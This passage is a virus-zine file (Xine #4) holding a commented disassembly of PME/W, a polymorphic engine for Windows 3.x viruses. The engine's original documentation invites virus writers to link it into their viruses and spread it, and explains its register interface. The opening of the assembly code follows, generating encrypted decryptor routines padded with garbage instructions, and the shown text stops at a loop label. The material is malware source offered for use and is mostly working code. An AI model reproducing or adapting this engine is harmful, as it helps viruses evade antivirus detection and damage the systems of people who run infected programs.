<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>pme.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #4 - Phile 310 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">


</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; PME/W v0.00                     Phantasie Mutation Engine for Windows v0.00</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Name            : PME/W</span><span class="sc0">
</span><span class="sc1">; Version         : 0.00</span><span class="sc0">
</span><span class="sc1">; Original Author : Burglar</span><span class="sc0">
</span><span class="sc1">; Original Size   : 1412 bytes</span><span class="sc0">
</span><span class="sc1">; Platform        : Win3x</span><span class="sc0">
</span><span class="sc1">; Kind            : Polymorphic Engine</span><span class="sc0">
</span><span class="sc1">; Origin          : Taipei (Taiwan)</span><span class="sc0">
</span><span class="sc1">; Dissassembly by : Billy Belceb£/iKX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Some comments   :</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Here follows my  second dissassembly (after KRTT, see my VWGs), and  i hope</span><span class="sc0">
</span><span class="sc1">; it won't be the last. I don't know if anyone had dissassemblied this engine</span><span class="sc0">
</span><span class="sc1">; before, but here i am, i did it (all) the 18 of May, in a boring  afternoon</span><span class="sc0">
</span><span class="sc1">; after doing a 'physic' exam. Well, ehem, nobody wants to know my life :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The engine itself is very simple, besides the  fact it's for Win3x viruses,</span><span class="sc0">
</span><span class="sc1">; i hadn't found anything special on it, and i really think that AV won't ha-</span><span class="sc0">
</span><span class="sc1">; ve to  work much  to detect it (as it has many fixed bytes). Well, you will</span><span class="sc0">
</span><span class="sc1">; see all the details in  the engine itself. Now, here you  have its original</span><span class="sc0">
</span><span class="sc1">; documentation.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ---[ PME/W DOCUMENTATION ]-------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Phantasie Mutation Engine for Windows &lt;tm&gt;           Version 0.00</span><span class="sc0">
</span><span class="sc1">;       Written by Burglar in Taipei, Taiwan.                  (95/07/16)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       1.  License</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       You are free to include this Engine in your Windows virii, and</span><span class="sc0">
</span><span class="sc1">;       your Windows virii don't injure anything.  Injure anything is</span><span class="sc0">
</span><span class="sc1">;       prohibited.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       2.  How to use it</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       when you want use it, you must declare below at first in code</span><span class="sc0">
</span><span class="sc1">;       segment.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       EXTRN   PMEW:NEAR, PMEW_END:NEAR</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Then you write your Windows virii as usual.  When you need to</span><span class="sc0">
</span><span class="sc1">;       encrypt the code, you just call the Engine.  Put the following</span><span class="sc0">
</span><span class="sc1">;       instruction in your code:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       CALL    PMEW</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       You also need to supply the parameters for the Engine.  They are</span><span class="sc0">
</span><span class="sc1">;       passed in registers.  Results are also passed in registers.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Of course, you must link the PMEW.OBJ module to your Windows virii</span><span class="sc0">
</span><span class="sc1">;       !</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       PMEW_END labeled the tail of your virii that includes the engine,</span><span class="sc0">
</span><span class="sc1">;       and you can use OFFSET PMEW_END to get the length of your Windows</span><span class="sc0">
</span><span class="sc1">;       virii that includes the engine.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       3.  Input parameters</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       All parameters are mandatory.  Description follows:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       ES:DI =&gt; Work space</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The Engine needs work space.  For placing product (decrypt code</span><span class="sc0">
</span><span class="sc1">;       &amp; encrypted code) which is generated by PME/W.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       DS:SI =&gt; Code to encrypt</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       On entry, just set DS:SI to point to the code you want to be</span><span class="sc0">
</span><span class="sc1">;       encrypted.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       CX = Length of code to encrypt</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       On entry, just set CX to the length of the code you want to be</span><span class="sc0">
</span><span class="sc1">;       encrypted.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       DX:AX =&gt; Relocation fixup information</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       When your virii has relocation records (such as you may call the</span><span class="sc0">
</span><span class="sc1">;       Windows APIs to do something, or your virii will pass control to</span><span class="sc0">
</span><span class="sc1">;       host program via intersegment jump, etc.) , you have to pass</span><span class="sc0">
</span><span class="sc1">;       pertinent information to PME/W.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Format of relocation fixup information:</span><span class="sc0">
</span><span class="sc1">;       Offset  Size    Description</span><span class="sc0">
</span><span class="sc1">;        00h    WORD    number of relocation items</span><span class="sc0">
</span><span class="sc1">;        02h 2N BYTEs   relocation items</span><span class="sc0">
</span><span class="sc1">;                       Offset  Size    Description</span><span class="sc0">
</span><span class="sc1">;                        00h    WORD    offset within segment</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       ATTENTION!</span><span class="sc0">
</span><span class="sc1">;       Your Windows virii must be zero start! (i.e. begin running with</span><span class="sc0">
</span><span class="sc1">;       CS:0000)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       4.  Results</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The Engine returns the following values in registers:</span><span class="sc0">
</span><span class="sc1">;       (all other except for the listed below will be PRESERVED)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       CX = Length of the decryption routine</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       CX now has the length of decryption routine.</span><span class="sc0">
</span><span class="sc1">;       ATTENTION! (mere length of decryption routine)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The product (decryption routine &amp; encrypted code) which generated</span><span class="sc0">
</span><span class="sc1">;       by PME/W is placed in Work space (i.e. pointed by ES:DI)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       5.  Final Notes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       SPECIAL THANKS:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       qark (for your Windows infection theory &amp; WinSurfer)</span><span class="sc0">
</span><span class="sc1">;       quantum (for WinSurfer &amp; grin me !@#$%^&amp;*)</span><span class="sc0">
</span><span class="sc1">;       metabolis (for leading vlad magazine &amp; tons of stuff)</span><span class="sc0">
</span><span class="sc1">;       malware (for NE format detail)</span><span class="sc0">
</span><span class="sc1">;       lookout (for tons of stuff)</span><span class="sc0">
</span><span class="sc1">;       kdkd (for tons of stuff &amp; blah.gif - fxxx with horse !@#$%^&amp;*)</span><span class="sc0">
</span><span class="sc1">;       horde (for tons of stuff - cvdq.arj)</span><span class="sc0">
</span><span class="sc1">;       dread (for giving me a account in Russia)</span><span class="sc0">
</span><span class="sc1">;       theora (you are the only one female interested in virii, could you</span><span class="sc0">
</span><span class="sc1">;               be my girl friend ?!)</span><span class="sc0">
</span><span class="sc1">;       slash (hehe... my teacher &amp; confident)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Well, that's for now.  No time for more.  No demonstration program</span><span class="sc0">
</span><span class="sc1">;       .</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Pass the Engine (all files together in an archive) to Windows virii</span><span class="sc0">
</span><span class="sc1">;       programmers.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Greetings to all virii programmers</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Burglar</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Taipei, Taiwan.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ---[ PME/W DOCUMENTATION ]-------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Well, i sincerely  hope that you find this simple (but very well coded) en-</span><span class="sc0">
</span><span class="sc1">; gine interesting. If anyone wanna know, i did this dissassembly with IDA :)</span><span class="sc0">
</span><span class="sc1">; Get it from internet (it's big, but a  very good program). Thanks to Slage,</span><span class="sc0">
</span><span class="sc1">; for  the 'thingy' that  he gave me  in Italy, and to Darkman, because he is</span><span class="sc0">
</span><span class="sc1">; the IDA god :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Btw, maybe you have  seen that it ain't too much commented... i don't  like</span><span class="sc0">
</span><span class="sc1">; to comment code that ain't mine... maybe i will  improve this, but not now,</span><span class="sc0">
</span><span class="sc1">; not today. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Bored and apathetic,</span><span class="sc0">
</span><span class="sc1">; Billy Belceb£/iKX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">p486</span><span class="sc0">

</span><span class="sc5">_PMEW</span><span class="sc0">           </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc10">private</span><span class="sc0"> </span><span class="sc12">''</span><span class="sc0"> </span><span class="sc9">use16</span><span class="sc0">

                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_PMEW</span><span class="sc0">
                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">gs</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
                </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">PMEW</span><span class="sc4">,</span><span class="sc5">PMEW_END</span><span class="sc0">
</span><span class="sc5">PMEW</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">engine_start</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">                     </span><span class="sc1">; hehehe</span><span class="sc0">

</span><span class="sc5">PMEW_Mark</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">" PME for Windows v0.00 (C) Jul 1995 By Burglar "</span><span class="sc0">

</span><span class="sc5">engine_start</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Push AX in stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; Push BX in stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; Push DX in stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">; Push BP in stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Push SI in stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Push DI in stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">              </span><span class="sc1">; Push DS in stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">              </span><span class="sc1">; Push ES in stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; BP -&gt; DS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Push AX in stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">              
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; BX -&gt; CS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">31h</span><span class="sc0">             </span><span class="sc1">; DPMI Services   ax=func xxxxh</span><span class="sc0">
                                        </span><span class="sc1">; CREATE CODE SEGMENT ALIAS DESCRIPTOR</span><span class="sc0">
                                        </span><span class="sc1">; BX = code segment selector</span><span class="sc0">
                                        </span><span class="sc1">; Return: CF set on error</span><span class="sc0">
                                        </span><span class="sc1">; CF clear if successful,</span><span class="sc0">
                                        </span><span class="sc1">; AX = new data selector</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; DS = new data selector = AX</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Restore AX from stack</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_delta</span><span class="sc0">          </span><span class="sc1">; Get Delta Offset</span><span class="sc0">
</span><span class="sc5">_delta</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_delta</span><span class="sc0">

</span><span class="sc5">init_values</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FDAAh</span><span class="sc0"> </span><span class="sc1">; Put SHIT value to 0FDAAh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">status_byte</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Make status byte to be 0</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">                     </span><span class="sc1">; hehe</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code_offset</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">; Save offset of code to enc.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code_segment</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc1">; Save its segment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">work_space</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">; Save offs. where dec. will go</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">work_segment</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc1">; Save its segment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">enc_length</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">; Save the size to encrypt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reloc_offset</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; Save offset of RELOC struc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reloc_segment</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; Save its segment</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">                     </span><span class="sc1">; Clear direction flag</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">     </span><span class="sc1">; Generate simple garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">         </span><span class="sc1">; Generate PUSHAD</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Put shit variable to 0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">     </span><span class="sc1">; Generate simple garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">         </span><span class="sc1">; Generate PUSH DS</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">     </span><span class="sc1">; Generate simple garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc0">         </span><span class="sc1">; Generate PUSH CS</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">     </span><span class="sc1">; Generate simple garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5Bh</span><span class="sc0">         </span><span class="sc1">; Generate POP BX</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">     </span><span class="sc1">; Generate simple garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">        </span><span class="sc1">; Generate MOV AX,imm16</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">         </span><span class="sc1">; Immediate</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">     </span><span class="sc1">; Generate simple garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31CDh</span><span class="sc0">       </span><span class="sc1">; Generate INT 31h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FF77h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">     </span><span class="sc1">; Generate simple garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D88Eh</span><span class="sc0">      </span><span class="sc1">; Generate MOV DS,AX</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">     </span><span class="sc1">; Generate simple garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BBh</span><span class="sc0">        </span><span class="sc1">; Generate MOV BX,imm16</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">scasw</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">shit</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">     </span><span class="sc1">; Generate simple garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">jmp_temp</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3780h</span><span class="sc0">       </span><span class="sc1">; Generate XOR [DI],imm16</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Save DI on stack</span><span class="sc0">
                </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D3F7h</span><span class="sc0">      </span><span class="sc1">; Generate NOT BX</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBF7h</span><span class="sc0">      </span><span class="sc1">; Generate NEG BX</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">              </span><span class="sc1">; Process RELOCS :)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reloc_offset</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reloc_segment</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; [SI] -&gt; CX</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">              </span><span class="sc1">; Restore DS from stack</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">lets_rock</span><span class="sc0">       </span><span class="sc1">; If CX = 0 goto lets_rock</span><span class="sc0">
</span><span class="sc5">l00py</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">; ...</span><span class="sc0">
